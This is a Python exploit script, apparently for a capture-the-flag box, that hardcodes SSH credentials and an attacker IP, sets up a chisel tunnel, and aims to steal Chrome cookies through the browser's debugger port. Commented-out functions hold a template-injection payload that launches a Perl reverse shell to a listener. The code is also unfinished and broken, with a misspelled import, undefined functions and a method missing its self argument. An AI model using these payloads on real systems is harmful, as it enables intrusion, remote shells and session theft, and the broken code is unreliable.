import sys
import site

import argparse
import requests
from urllib.parse import urlencode
from pwn import *
import threading 


# From exploit-tool-box
from  malay_toolbox import connect_with_ssh, Chdannel, SSHClient, setup_local_chisel_server





class Exploit: 
    def __init__(self):
        self.attacker_ip = "10.10.14.159"
        self.ssh_creds = {
            "username": "michael",
            "password": "insaneclownposse"
        }
        self.chisel_fingerprint = ""
        


    def exploit(self):
        self.chisel_fingerprint = setup_local_chisel_server()
        
        connect_with_ssh(self.attacker_ip, self.ssh_creds["username"], self.ssh_creds["password"], self._actions_over_ssh)


    def _actions_over_ssh(channel: Channel, _: SSHClient):
        
        channel.r
        debugger_port = find_chrome_debugger_port()
        tunnel_port(debugger_port)
        cookie = steal_chrome_cookies(debugger_port)
        
        return


# def connect_with_ssh():

# def api_signin(session, url, email, password):
#     endpoint = f"{url}/api/signin"
#     headers = {
#         'Accept': 'application/json',
#         'Accept-Language': 'en-US,en;q=0.5',
#         'Accept-Encoding': 'gzip, deflate, br',
#         'Content-Type': 'application/json',
#         'Origin': url,
#         'Connection': 'keep-alive',
#     }
#     body = {
#         "email": email,
#         "password": password
#     }

#     response = session.post(endpoint, json=body, headers=headers)
#     return response.status_code == 200

# def api_exploit(session, url, lhost, lport):
#     endpoint = f"{url}/api/test-connection"
#     headers = {
#         'Accept': 'application/json',
#         'Accept-Language': 'en-US,en;q=0.5',
#         'Accept-Encoding': 'gzip, deflate, br',
#         'Content-Type': 'application/json',
#         'Origin': url,
#         'Connection': 'keep-alive',
#     }
#     payload = f'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''
#     body = {
#         "name": f"{{{{ process.mainModule.require('child_process').exec(decodeURIComponent('{urlencode(payload)}')) }}}}",
#         "driver": "mysql"
#     }

#     response = session.post(endpoint, json=body, headers=headers)
#     return response.status_code == 400 and "ECONNREFUSED" in response.text

# def start_listener(lhost, lport):
#     listener = listen(lport, bindaddr=lhost)
#     listener.wait_for_connection()
#     listener.interactive()



Exploit()._actions_over_ssh()